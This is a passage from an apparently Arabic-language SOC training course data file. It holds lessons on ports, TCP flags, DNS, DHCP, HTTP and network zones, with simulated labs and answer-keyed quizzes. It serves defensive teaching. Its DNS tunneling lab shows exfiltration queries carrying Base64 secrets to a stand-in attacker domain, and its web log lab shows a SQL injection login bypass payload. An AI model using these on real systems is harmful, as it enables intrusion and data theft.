    <span class="lab-tag">💻 محاكي فحص المنافذ المفتوحة (Port Scanner Simulation)</span>
    <h4>تحليل مخرجات فحص Nmap لكشف المنافذ المكشوفة</h4>
  </div>
  <p>تفحص نتائج فحص سيرفر داخلي حساس واكتشف المنافذ الخطرة المفتوحة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> nmap-scan-viewer</div>
    <pre class="terminal-code">PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 2.3.4 (VULNERABLE - Backdoor present)
22/tcp   open  ssh           OpenSSH 8.2p1
80/tcp   open  http          Apache httpd 2.4.41
445/tcp  open  netbios-ssn   Samba smbd 4.6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services (RDP Exposed!)</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('netstat -an | findstr 445', 'standalone-term-body'); app.showToast('تم فحص حالة منفذ الـ SMB 445', 'info');">فحص منفذ SMB 445 محلياً</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "أي منفذ من المنافذ التالية يعد الأكثر خطورة عند تركه مفتوحاً ومواشراً للإنترنت الخارجي في خوادم ويندوز بسبب ارتباطه ببرمجيات الفدية وهجمات التخمين؟",
          questionEn: "Which port is most critical when exposed to the internet on Windows?",
          optionsAr: [
            "منفذ 3389 (RDP - Remote Desktop Protocol)",
            "منفذ 80 (HTTP)",
            "منفذ 123 (NTP)",
            "منفذ 53 (DNS)"
          ],
          optionsEn: [
            "Port 3389 (RDP)",
            "Port 80 (HTTP)",
            "Port 123 (NTP)",
            "Port 53 (DNS)"
          ],
          correctIndex: 0,
          explanationAr: "يعد منفذ 3389 (RDP) البوابة الذهبية لعصابات الفدية؛ فبمجرد تخمين كلمة سر مستخدم أو استغلال ثغرة فيه، يحصل المهاجم على واجهة رسومية تفاعلية كاملة للتحكم في الخادم."
        }
      },
      {
        id: "lesson-2-6",
        courseId: "course-2",
        number: "2.6",
        titleAr: "بروتوكول TCP vs UDP، تشريح المصافحة الثلاثية (3-Way Handshake)، وقراءة أعلام الـ TCP Flags (SYN, ACK, FIN, RST, PSH, URG)",
        titleEn: "TCP vs UDP, 3-Way Handshake Anatomy & TCP Flags (SYN, ACK, FIN, RST, PSH, URG)",
        duration: "55 min",
        theoryAr: `
<h3>حوار الوثوقية: كيف تؤسس الجلسات وكيف تُقرأ إشارات الأعلام السرية؟</h3>
<p class="lead">في الطبقة الرابعة، يحدد البروتوكول طريقة نقل البيانات: إما موثوقية تامة وتأكيد استلام (TCP)، أو سرعة قصوى دون ضمانات (UDP). فهم أعلام الـ TCP هو المفتاح لقراءة فحوصات الشبكة وهجمات حجب الخدمة.</p>

<h4>1. المصافحة الثلاثية لـ TCP (The 3-Way Handshake)</h4>
<p>قبل إرسال بايت واحد من البيانات، يجب إنشاء اتصال رسمي عبر 3 خطوات:</p>
<ol>
  <li><strong>العميل يرسل [SYN]:</strong> <em>"مرحباً، أود بدء اتصال معك، ورقم التسلسل المبدئي لي هو Seq=100"</em>.</li>
  <li><strong>الخادم يرد بـ [SYN, ACK]:</strong> <em>"أهلاً بك، أوافق على الاتصال، استلمت حزمتك (Ack=101)، ورقم التسلسل الخاص بي هو Seq=300"</em>.</li>
  <li><strong>العميل يؤكد بـ [ACK]:</strong> <em>"استلمت موافقتك (Ack=301)، الاتصال تأسس رسمياً الآن فلنبدأ بنقل البيانات!"</em>.</li>
</ol>

<h4>2. الأعلام الستة الأساسية لـ TCP (TCP Control Flags)</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>العلم (Flag)</th>
        <th>المعنى والوظيفة</th>
        <th>الاستغلال الأمني وسياق الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>SYN (Synchronize)</strong></td><td>طلب مزامنة وبدء جلسة جديدة.</td><td>استغلاله في هجمات <strong>SYN Flood DDoS</strong> وإغراق الخادم بطلبات وهمية.</td></tr>
      <tr><td><strong>ACK (Acknowledgment)</strong></td><td>تأكيد استلام حزمة سابقة بنجاح.</td><td>يستخدم للتحقق من وصول البيانات وتتبع تدفق الجلسة في Wireshark.</td></tr>
      <tr><td><strong>FIN (Finish)</strong></td><td>إنهاء الجلسة بشكل مهذب وطبيعي من أحد الطرفين.</td><td>نهاية الاتصال الاعتيادية.</td></tr>
      <tr><td><strong>RST (Reset)</strong></td><td>إسقاط الاتصال فوراً وبشكل مفاجئ لوجود خلل أو رفض للمنفذ.</td><td>يظهر بكثافة عند فحص المنافذ المغلقة، أو عند قيام الجدار الناري بقطع اتصال خبيث.</td></tr>
      <tr><td><strong>PSH (Push)</strong></td><td>إجبار المستقبل على تمرير البيانات فوراً للتطبيق دون انتظار ملء الـ Buffer.</td><td>شائع جداً في رسائل الدردشة، قذائف الـ Shell، والتطبيقات التفاعلية الفورية.</td></tr>
      <tr><td><strong>URG (Urgent)</strong></td><td>البيانات داخل هذه الحزمة طارئة ويجب معالجتها فوراً قبل غيرها.</td><td>نادراً ما يستخدم في التطبيقات العادية؛ ظهوره أحياناً يرتبط بفحوصات Xmas Scans.</td></tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص الأعلام في Wireshark (TCP Flags Inspector)</span>
    <h4>تشريح أعلام حزمة شبكية التقطت أثناء هجوم SYN Scan</h4>
  </div>
  <p>شاهد تحليل مصفوفة الأعلام الستة في الحزمة المعروضة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> wireshark-flags-view</div>
    <pre class="terminal-code">Transmission Control Protocol (TCP):
  Source Port: 49152 | Destination Port: 445
  Flags: 0x002 (SYN)
    0000 0000 0010 = Flags: 0x002
    .... ...0 .... = Urgent (URG): Not set
    .... .... 0... = Acknowledgment (ACK): Not set
    .... .... .0.. = Push (PSH): Not set
    .... .... ..0. = Reset (RST): Not set
    .... .... ...1 = Syn (SYN): Set (Connection Request)
    .... .... .... 0 = Fin (FIN): Not set</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "عندما يرسل المهاجم حزمة SYN لمنفذ معين، ويرد الهدف فوراً بحزمة تحمل علم [RST, ACK]، فماذا يستنتج المهاجم؟",
          questionEn: "What does a [RST, ACK] reply to a SYN indicate?",
          optionsAr: [
            "أن المنفذ مغلق (Closed) على الخادم الهدف والخدمة غير مشغلة",
            "أن المنفذ مفتوح وجاهز لاستقبال البيانات",
            "أن الخادم تعرض للتدمير بالكامل",
            "أن الاتصال مشفر بتشفير عسكري"
          ],
          optionsEn: [
            "The port is closed on the target host",
            "The port is open",
            "The server is destroyed",
            "The connection is encrypted"
          ],
          correctIndex: 0,
          explanationAr: "وفق معايير TCP RFC، عندما يستلم نظام التشغيل حزمة SYN متجهة لمنفذ لا يستمع عليه أي تطبيق (Closed Port)، يرسل نظام التشغيل حزمة [RST, ACK] لرفض الاتصال فوراً وإبلاغ المصدر بعدم المحاولة."
        }
      },
      {
        id: "lesson-2-7",
        courseId: "course-2",
        number: "2.7",
        titleAr: "تشريح بروتوكول DNS (أنواع السجلات A, AAAA, CNAME, MX, TXT, NS, PTR) وكيف يستخدمه المهاجمون في التسلل ونقل البيانات (DNS Tunneling)",
        titleEn: "DNS Architecture, Records (A, AAAA, CNAME, MX, TXT, PTR) & DNS Tunneling Attacks",
        duration: "55 min",
        theoryAr: `
<h3>دليل الهاتف العالمي: قلب الإنترنت وأخطر قنوات التسلل الخفية</h3>
<p class="lead">بروتوكول نظام أسماء النطاقات (Domain Name System - DNS) يترجم الأسماء المفهومة للبشر (مثل <code>google.com</code>) إلى عناوين IP تفهمها الأجهزة (مثل <code>142.250.180.206</code>). يعمل عبر منفذ UDP 53 (وللاستعلامات الكبيرة ونقل النطاقات عبر TCP 53).</p>

<h4>أنواع سجلات الـ DNS الأساسية التي يفحصها محلل الـ SOC:</h4>
<ul>
  <li><strong>سجل A:</strong> يربط اسم النطاق بعنوان <strong>IPv4</strong>.</li>
  <li><strong>سجل AAAA:</strong> يربط اسم النطاق بعنوان <strong>IPv6</strong> الحديث.</li>
  <li><strong>سجل CNAME (Canonical Name):</strong> اسم مستعار يحيل نطاقاً إلى نطاق آخر (Alias).</li>
  <li><strong>سجل MX (Mail Exchange):</strong> يحدد الخوادم المسؤولة عن استقبال البريد للنطاق.</li>
  <li><strong>سجل TXT:</strong> يحتوي على نصوص مخصصة؛ يُستخدم عالمياً لإثبات ملكية النطاق وتأمين البريد الإلكتروني عبر بروتوكولات (SPF, DKIM, DMARC).</li>
  <li><strong>سجل NS (Name Server):</strong> يحدد خوادم الأسماء المعتمدة للنطاق.</li>
  <li><strong>سجل PTR (Pointer):</strong> البحث العكسي؛ يحول عنوان الـ IP إلى اسم نطاق (Reverse DNS Lookup).</li>
</ul>

<h4>كيف يستغل المهاجمون الـ DNS في هجمات التسلل (DNS Tunneling & C2)؟</h4>
<p>نادراً ما تقوم المؤسسات بحظر منفذ DNS 53 في جدران الحماية لأن حظره يعطل تصفح الإنترنت للموظفين. يستغل المهاجمون هذه الثغرة لإنشاء <strong>نفق DNS (DNS Tunneling)</strong>:</p>
<p>يقوم المالوير بتشفير الملفات المسروقة وتقطيعها ثم إرسالها كاستعلامات نطاقات فرعية متتالية لخادم DNS يتحكم فيه المهاجم (Authoritative DNS)، مثل: <code>exfiltrated_passwords.attacker-c2.com</code>. يستقبل خادم الهكر الاستعلام ويفك تشفير البيانات دون أن يمر أي اتصال مباشر بين الضحية وسيرفر الهكر!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف استعلامات الـ DNS المشبوهة (DNS Query Inspector)</span>
    <h4>فحص سجلات الـ DNS لرصد هجمات تسريب البيانات (Exfiltration)</h4>
  </div>
  <p>تفحص تدفق استعلامات الـ DNS الصادرة من أحد أجهزة الشبكة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> dns-traffic-monitor</div>
    <pre class="terminal-code">QUERY: YWRtaW5fcGFzc3dvcmQxMjM=.tunnel.evil-actor.xyz  (Type: TXT, Size: 128 bytes)
QUERY: c2VjcmV0X2ZpbmFuY2lhbF9yZXBvcnQ=.tunnel.evil-actor.xyz (Type: TXT, Size: 132 bytes)
QUERY: dG9wX3NlY3JldF9kYXRhX2R1bXA=.tunnel.evil-actor.xyz (Type: TXT, Size: 140 bytes)
[ALERT] High query frequency (>150 queries/min) with high-entropy Base64 subdomains detected!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('nslookup -type=TXT test.domain', 'standalone-term-body'); app.showToast('تم محاكاة استعلام سجل TXT', 'info');">تجربة استعلام DNS: nslookup</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هي السمة البارزة في سجلات الـ DNS التي تدل محلل الـ SOC على وجود هجوم DNS Tunneling لتهريب البيانات؟",
          questionEn: "What key indicator alerts an analyst to DNS Tunneling?",
          optionsAr: [
            "تدفق عدد هائل من استعلامات الـ DNS لنطاقات فرعية طويلة جداً تتكون من نصوص عشوائية ومشفرة بـ Base64 لنفس النطاق الخارجي",
            "استعلام المستخدم عن موقع google.com مرة واحدة في الصباح",
            "توقف شاشة الحاسوب عن العمل فجأة",
            "ظهور رسالة تطلب تحديث المتصفح"
          ],
          optionsEn: [
            "A high volume of queries for unusually long, high-entropy Base64 subdomains under the same external domain",
            "A single query to google.com",
            "Screen blackouts",
            "Browser update notifications"
          ],
          correctIndex: 0,
          explanationAr: "تتميز هجمات DNS Tunneling بنصوص عشوائية طويلة وغير مفهومة (High Entropy) في أسماء النطاقات الفرعية لأنها تحتوي على البيانات المسروقة مشفرة لنقلها بالقطارة عبر استعلامات الـ DNS."
        }
      },
      {
        id: "lesson-2-8",
        courseId: "course-2",
        number: "2.8",
        titleAr: "تشريح بروتوكول DHCP (عملية DORA) وبروتوكولات البريد الإلكتروني (SMTP, POP3, IMAP) وبروتوكولات نقل الملفات (FTP, SMB, SSH, RDP)",
        titleEn: "DHCP DORA Process, Mail Protocols (SMTP/IMAP) & File Transfer Architecture (FTP, SMB, SSH, RDP)",
        duration: "50 min",
        theoryAr: `
<h3>بروتوكولات الخدمات الحيوية في شبكة المؤسسة</h3>
<p class="lead">لكي تبدأ أي بيئة عمل في التواصل، يحتاج الجهاز لعنوان تلقائي (DHCP)، ووسيلة لنقل الملفات بين الإدارات (SMB/FTP)، وخدمة لتبادل البريد الإلكتروني. كل واحد من هذه البروتوكولات يمثل ساحة صراع أمني خاصة.</p>

<h4>1. تشريح عملية الـ DHCP وعملية DORA الرباعية</h4>
<p>عندما يوصل الموظف جهازه بالشبكة، يمر بأربع خطوات معيارية للحصول على إعدادات الاتصال:</p>
<ol>
  <li><strong>Discover (بث عام):</strong> العميل يصرخ في الشبكة: <em>"هل يوجد خادم DHCP هنا؟ أنا بحاجة لعنوان IP!"</em>.</li>
  <li><strong>Offer (بث عام أو أحادي):</strong> يرد الخادم: <em>"أنا خادم DHCP، وأعرض عليك عنوان 192.168.1.50 لمدة 8 ساعات"</em>.</li>
  <li><strong>Request (بث عام):</strong> العميل: <em>"موافق، أطلب رسمياً حجز العنوان 192.168.1.50"</em>.</li>
  <li><strong>Acknowledge (ACK):</strong> الخادم: <em>"تم تأكيد حجز العنوان لك مع إعدادات بوابة الشبكة (Gateway) وسيرفرات الـ DNS"</em>.</li>
</ol>
<p><strong>التهديد الأمني:</strong> هجوم الخادم المزيف (Rogue DHCP Server) حيث يقوم الهكر بتشغيل سيرفر DHCP مزيف يوزع عنوانه هو كبوابة افتراضية للضحايا للتجسس على كل ترافيك الشبكة.</p>

<h4>2. بروتوكولات البريد الإلكتروني (Email Protocols)</h4>
<ul>
  <li><strong>SMTP (منفذ 25 / 587):</strong> لإرسال البريد فقط (Push Protocol).</li>
  <li><strong>POP3 (منفذ 110 / 995):</strong> لتنزيل البريد وحذفه من السيرفر.</li>
  <li><strong>IMAP (منفذ 143 / 993):</strong> لمزامنة البريد مع الخادم مع إبقاء النسخة الأصلية على السيرفر (الأكثر استخداماً في الشركات).</li>
</ul>

<h4>3. بروتوكولات مشاركة ونقل الملفات</h4>
<ul>
  <li><strong>SMB (منفذ 445):</strong> بروتوكول ويندوز القياسي لمشاركة الملفات والطابعات؛ المنفذ الأخطر في الشبكات الداخلية.</li>
  <li><strong>FTP (منفذ 21):</strong> نقل ملفات قديم وغير مشفر.</li>
  <li><strong>SSH / SFTP (منفذ 22):</strong> نقل ملفات مشفر ومؤمن.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تتبع حزم DHCP DORA (DHCP Transaction Analyzer)</span>
    <h4>مراقبة حزم الـ DORA الأربعة أثناء اتصال جهاز جديد</h4>
  </div>
  <p>شاهد تدفق الحزم عبر المنفذين UDP 67 و 68:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> dhcp-sniffer</div>
    <pre class="terminal-code">1. [DHCPDISCOVER] Client MAC: 00:0c:29:44:aa:10 -> Dst: 255.255.255.255 (UDP 68 -> 67)
2. [DHCPOFFER]    Server IP: 10.0.0.1 -> Client MAC (Offered IP: 10.0.0.85, Lease: 86400s)
3. [DHCPREQUEST]  Client MAC -> Dst: 255.255.255.255 (Requesting: 10.0.0.85 from 10.0.0.1)
4. [DHCPACK]      Server IP: 10.0.0.1 -> Client MAC (Confirmed: Mask 255.255.255.0, GW: 10.0.0.1, DNS: 10.0.0.2)</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الترتيب الصحيح للخطوات الأربع التي ينفذها بروتوكول DHCP لتعيين عنوان IP لجهاز كمبيوتر؟",
          questionEn: "What is the correct order of the DHCP DORA process?",
          optionsAr: [
            "Discover ثم Offer ثم Request ثم Acknowledge (DORA)",
            "Delete ثم Open ثم Read ثم Access",
            "Download ثم Output ثم Reboot ثم Apply",
            "Disconnect ثم Overload ثم Reconnect ثم Abort"
          ],
          optionsEn: [
            "Discover, Offer, Request, Acknowledge (DORA)",
            "Delete, Open, Read, Access",
            "Download, Output, Reboot, Apply",
            "Disconnect, Overload, Reconnect, Abort"
          ],
          correctIndex: 0,
          explanationAr: "تختصر العملية بكلمة DORA: العميل يبحث (Discover)، الخادم يعرض (Offer)، العميل يطلب الحجز (Request)، الخادم يؤكد ويثبت الحجز (Acknowledge)."
        }
      },
      {
        id: "lesson-2-9",
        courseId: "course-2",
        number: "2.9",
        titleAr: "تشريح بروتوكول الويب HTTP/HTTPS (طرق الطلب GET, POST, PUT, DELETE، الترويسات Headers, User-Agent, Cookies، أكواد الحالة 200, 301, 401, 403, 404, 500، وشهادات SSL/TLS)",
        titleEn: "Web Protocols Anatomy: HTTP/HTTPS Methods, Headers, Status Codes & TLS Handshake",
        duration: "55 min",
        theoryAr: `
<h3>لغة الويب المفتوحة: تشريح كل بايت في طلبات واستجابات المتصفح</h3>
<p class="lead">أكثر من 85% من الهجمات الحديثة تبدأ أو تتصل عبر بروتوكولات الويب (HTTP/HTTPS). فهم ترويسات الويب وأكواد الحالة هو المهارة اليومية التي يحتاجها محلل الـ SOC لتحليل سجلات الـ Proxies وسيرفرات الويب.</p>

<h4>1. طرق الطلب الأساسية (HTTP Request Methods)</h4>
<ul>
  <li><strong>GET:</strong> طلب جلب بيانات أو صفحات من الخادم (المعاملات تظهر في الرابط URL).</li>
  <li><strong>POST:</strong> إرسال بيانات حساسة للخادم داخل جسم الطلب (مثل بيانات تسجيل الدخول أو رفع ملفات).</li>
  <li><strong>PUT:</strong> استبدال أو رفع ملف كامل على الخادم (يستغل في رفع ملفات Web Shells خبيثة إذا لم يؤمن).</li>
  <li><strong>DELETE:</strong> طلب حذف ملف أو مورد من السيرفر.</li>
</ul>

<h4>2. أهم الترويسات الأمنية (HTTP Headers)</h4>
<ul>
  <li><strong>User-Agent:</strong> يحدد نوع المتصفح ونظام التشغيل؛ يستخدمه المحلل لكشف الأدوات الآلية وبرمجيات الهكر الخبيثة (مثل سكريبتات Python أو قذائف C2 التي تترك User-Agent افتراضياً مشبوهاً).</li>
  <li><strong>Host:</strong> النطاق المطلوب استدعاؤه على السيرفر.</li>
  <li><strong>Referer:</strong> الصفحة السابقة التي نقر عليها المستخدم ليصل لهذا الرابط (يكشف مسار التصيد Phishing).</li>
  <li><strong>Cookie:</strong> الرمز التعريفي للجلسة (Session ID)؛ هدف أساسي لهجمات سرقة الجلسات (Session Hijacking).</li>
</ul>

<h4>3. أكواد الحالة القياسية (HTTP Status Codes)</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>فئة الكود</th>
        <th>أشهر الأكواد</th>
        <th>المعنى والسياق الأمني في الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>2xx Success</strong></td><td><code>200 OK</code></td><td>تم تنفيذ الطلب بنجاح؛ إذا كان على صفحة حساسة بعد محاولات فاشلة دل على اختراق ناجح.</td></tr>
      <tr><td><strong>3xx Redirection</strong></td><td><code>301 Moved, 302 Found</code></td><td>إعادة توجيه المتصفح لصفحة أخرى؛ يستغل في روابط التصيد لإخفاء الوجهة الحقيقية.</td></tr>
      <tr><td><strong>4xx Client Error</strong></td><td><code>401 Unauthorized, 403 Forbidden, 404 Not Found</code></td><td>أخطاء من جهة العميل؛ ظهور آلاف من أكواد 404 في ثوانٍ يدل على فحص آلي لمسارات السيرفر (DirBuster/Gobuster)، وظهور 401/403 بكثافة يدل على هجوم تخمين كلمات مرور (Brute Force).</td></tr>
      <tr><td><strong>5xx Server Error</strong></td><td><code>500 Internal Error, 502 Bad Gateway</code></td><td>أخطاء انهيار داخل السيرفر؛ تظهر بكثافة عند تجربة حمولات استغلال ثغرات مثل SQL Injection أو Buffer Overflow.</td></tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص سجلات الويب (Web Log Investigator)</span>
    <h4>تحليل محاولة استغلال ثغرة حقن أوامر SQL عبر HTTP POST</h4>
  </div>
  <p>تفحص الطلب التالي المأخوذ من سجلات خادم الويب Apache:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> web-request-inspector</div>
    <pre class="terminal-code">POST /login.php HTTP/1.1
Host: secure-portal.company.local
User-Agent: sqlmap/1.5.2#stable (http://sqlmap.org)  <-- AUTOMATED ATTACK TOOL!
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

username=admin' OR '1'='1' --&password=invalid_pass

HTTP/1.1 200 OK
Set-Cookie: session_id=ADMIN_SESSION_TOKEN_88491; HttpOnly</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('curl -I http://example.com', 'standalone-term-body'); app.showToast('تم فحص ترويسات الويب HTTP Headers', 'info');">فحص ترويسات الويب: curl -I</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "إذا لاحظت في سجلات الـ Proxy أن مستخدماً داخلياً يرسل مئات الطلبات التي تحمل ترويسة User-Agent التالية: `python-requests/2.28.1` وتستقبل أكواد 404 بكثافة، فماذا تستنتج؟",
          questionEn: "What does python-requests User-Agent with 404 spikes indicate?",
          optionsAr: [
            "وجود سكريبت بايثون آلي يقوم بفحص مسارات الموقع والبحث عن ثغرات أو لوحات تحكم مكشوفة",
            "المستخدم يتصفح موقع يوتيوب بشكل طبيعي",
            "نظام التشغيل يقوم بتحديث برامج الأوفيس",
            "المتصفح متصل بكابل ألياف ضوئية سريع"
          ],
          optionsEn: [
            "An automated Python script brute-forcing directory paths searching for vulnerabilities",
            "Normal YouTube streaming",
            "Windows Office updates",
            "Fast fiber optic cable connection"
          ],
          correctIndex: 0,
          explanationAr: "ترويسة `python-requests` هي القيمة الافتراضية لمكتبة Requests في بايثون، واستخدامها مع توليد مئات أكواد 404 يدل بوضوح على أداة فحص آلية ومحاولة اكتشاف ملفات خفية على السيرفر."
        }
      },
      {
        id: "lesson-2-10",
        courseId: "course-2",
        number: "2.10",
        titleAr: "معمارية الشبكات المؤمنة في الشركات: أين نضع الـ Router, Switch, Firewall, Proxy, WAF, DMZ, VPN، وكيف نجمع الترافيك عبر (SPAN Port / Network TAP)؟",
        titleEn: "Secure Corporate Network Architecture: Firewalls, Proxies, WAF, DMZ, VPN & Traffic Capture (SPAN/TAP)",
        duration: "55 min",
        theoryAr: `
<h3>معمارية الدفاع في العمق: كيف تبنى وتراقب الشبكات الحصينة في الشركات؟</h3>
<p class="lead">لا يتم وضع الأجهزة في الشركات عبثاً في شبكة مسطحة واحدة (Flat Network)؛ لأن ذلك يسمح لأي جهاز يصاب بفيروس فدية بتشفير كل الخوادم في ثوانٍ. تعتمد المؤسسات على <strong>تقسيم المناطق الأمنية (Network Segmentation & Defense-in-Depth)</strong>.</p>

<h4>1. المناطق الأمنية المعيارية في الشركات (Network Zones)</h4>
<ul>
  <li><strong>منطقة الـ DMZ (Demilitarized Zone - المنطقة منزوعة السلاح):</strong> منطقة وسيطة معزولة تستضيف الخوادم الموجهة للجمهور الخارجي (مثل خادم موقع الشركة، خادم البريد، وخادم الـ VPN). حتى لو تم اختراق خادم في الـ DMZ، فإن الجدار الناري الداخلي يمنع المهاجم من التسلل إلى شبكة الحواسيب الداخلية.</li>
  <li><strong>الشبكة الداخلية الموثوقة (Internal LAN):</strong> حواسيب الموظفين، معزولة عن السيرفرات وعن زوار شبكة الـ Wi-Fi عبر تقنية VLANs.</li>
  <li><strong>منطقة الخوادم وقواعد البيانات (Server Farm / Data Center):</strong> المنطقة الأكثر حساسية وحماية، لا يمكن الوصول إليها إلا عبر مصادقة متعددة وقواعد فايروول صارمة.</li>
</ul>

<h4>2. أجهزة الدفاع وتوزيعها</h4>
<ul>
  <li><strong>WAF (Web Application Firewall):</strong> يوضع مباشرة أمام خوادم الويب في الـ DMZ لتفتيش طلبات الطبقة السابعة وحجب هجمات OWASP (مثل SQLi و XSS).</li>
  <li><strong>Forward Proxy:</strong> يوضع بين حواسيب الموظفين والإنترنت لفحص تصفحهم، حظر المواقع المشبوهة، وفحص الترافيك المشفر (SSL Inspection).</li>
  <li><strong>VPN Gateway:</strong> تسمح للموظفين بالعمل عن بُعد بأمان عبر نفق مشفر.</li>
</ul>

<h4>3. كيف نلتقط حركة الشبكة لتغذية الـ IDS والـ SIEM؟</h4>
<p>لكي يرى محلل الـ SOC الحزم في Wireshark أو Snort، نحتاج إلى نسخ حركة الشبكة بطريقتين:</p>
<ul>
  <li><strong>منفذ النسخ في السويتش (SPAN Port / Port Mirroring):</strong> منفذ برمجي في السويتش يقوم بنسخ كل الحزم المارة على منافذ معينة وإرسالها إلى مجس الاستشعار (Sensor). عيبه أنه قد يسقط بعض الحزم عند حدوث ضغط عالي على معالج السويتش.</li>
  <li><strong>حنفية الشبكة العتادية (Network TAP - Test Access Point):</strong> جهاز فيزيائي عتادي مستقل يوضع في مسار الكابل مباشرة، يقوم بشطر الإشارة الضوئية أو الكهربائية فيزيائياً إلى نسختين بدقة 100% دون أي تأخير أو استهلاك لمعالج أجهزة الشبكة.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي معمارية الشبكة (Enterprise Topology Simulator)</span>
    <h4>تتبع مرور الحزمة من الإنترنت عبر جدران الحماية حتى الـ DMZ</h4>
  </div>
  <p>شاهد مسار التفتيش الذي تمر به حزمة اتصال قادمة من الخارج:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> enterprise-network-flow</div>
    <pre class="terminal-code">[INTERNET] -> [Edge Router]
 â””â”€> [External Firewall: Palo Alto PA-5220] (Stateful Packet Inspection: Permitted Port 443)
      â””â”€> [Hardware Network TAP] -> (Mirrors 100% copy to Zeek & Suricata IDS)
           â””â”€> [WAF: F5 BIG-IP] (Decrypted TLS, Inspected HTTP Payload: Clean)
                â””â”€> [DMZ Switch VLAN 20] -> [Web Server Nginx: 10.0.20.15] (Target Reached Safely)</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هي الفائدة الجوهرية لاستخدام جهاز Network TAP العتادي مقارنة بمنفذ SPAN Port البرمجي في السويتش لالتقاط حركة الشبكة في مراكز الـ SOC؟",
          questionEn: "What is the key advantage of a Hardware Network TAP over a SPAN Port?",
          optionsAr: [
            "الـ Network TAP ينسخ حركة الشبكة فيزيائياً بدقة 100% دون استهلاك موارد معالج السويتش ودون إسقاط أي حزم في أوقات الذروة",
            "الـ Network TAP يقوم بمسح الفيروسات من الأجهزة تلقائياً",
            "الـ Network TAP يلغي الحاجة إلى استخدام جدران الحماية نهائياً",
            "الـ Network TAP مجاني تماماً ولا يحتاج لأي كابلات"
          ],
          optionsEn: [
            "Hardware TAP copies 100% of packets physically without dropping frames or burdening switch CPU during peak loads",
            "Hardware TAP auto-cleans viruses",
            "Hardware TAP eliminates firewalls",
            "Hardware TAP is completely cable-free"
          ],
          correctIndex: 0,
          explanationAr: "أجهزة الـ Network TAP مخصصة للمراقبة الصارمة حيث لا تفقد أي باكت على الإطلاق حتى في أقصى طاقات الشبكة (Line-Rate Capture)، بخلاف الـ SPAN الذي قد يسقط الحزم (Drop Packets) عندما ينشغل معالج السويتش بتوجيه البيانات الأساسية."
        }
      }
    ]
  },
  {
    id: "course-3",
    courseNumber: 3,
    level: "beginner",
    levelNameAr: "المستوى الأول: مبتدئ",
    levelNameEn: "Level 1: Beginner",
    levelBadgeColor: "#10B981",
    titleAr: "إتقان أنظمة التشغيل Windows & Linux من الصفر",
    titleEn: "Windows & Linux Operating Systems Internals from Scratch",
    summaryAr: "التشريح الداخلي للأنظمة: وضع النواة والمستخدم، العمليات الأساسية لويندوز وتمييز الشرعي من المزيف، أسرار الريجستري ومفاتيح التشغيل التلقائي، فك تشفير PowerShell المشفر، ثم الهيكلية العميقة لنظام Linux وصلاحيات SUID وسجلات التحقيق الجنائي.",
    summaryEn: "Deep OS internals: Kernel vs User mode, Windows Core Processes, Registry persistence, PowerShell de-obfuscation, Linux hierarchy, permissions, and CLI log analysis.",
    icon: "💻",
    duration: "10 ساعات تدريبية",
    lessonsCount: 10,
    badgeAr: "خبير أنظمة التشغيل والتحقيق الجنائي",
    badgeEn: "OS Internals Specialist",
    lessons: [
      {
        id: "lesson-3-1",
        courseId: "course-3",
        number: "3.1",
        titleAr: "معمارية نظام Windows من الداخل (Kernel Mode vs User Mode) ونظام الملفات NTFS (MFT, Permissions, ADS)",
        titleEn: "Windows Internals Architecture: Kernel vs User Mode & NTFS System (MFT, ADS)",
        duration: "50 min",
        theoryAr: `
<h3>داخل الصندوق الأسود لويندوز: كيف يُدار المعالج والذاكرة والتخزين؟</h3>
<p class="lead">يقسم نظام ويندوز عملياته بدقة متناهية إلى مستويين من الصلاحيات لحماية استقرار النظام وأمانه: وضع النواة (Kernel Mode) ووضع المستخدم (User Mode). فهم هذا الفصل هو حجر الأساس لكشف برمجيات Rootkits وتقنيات حقن الذاكرة.</p>

<h4>1. وضع النواة (Ring 0 - Kernel Mode)</h4>
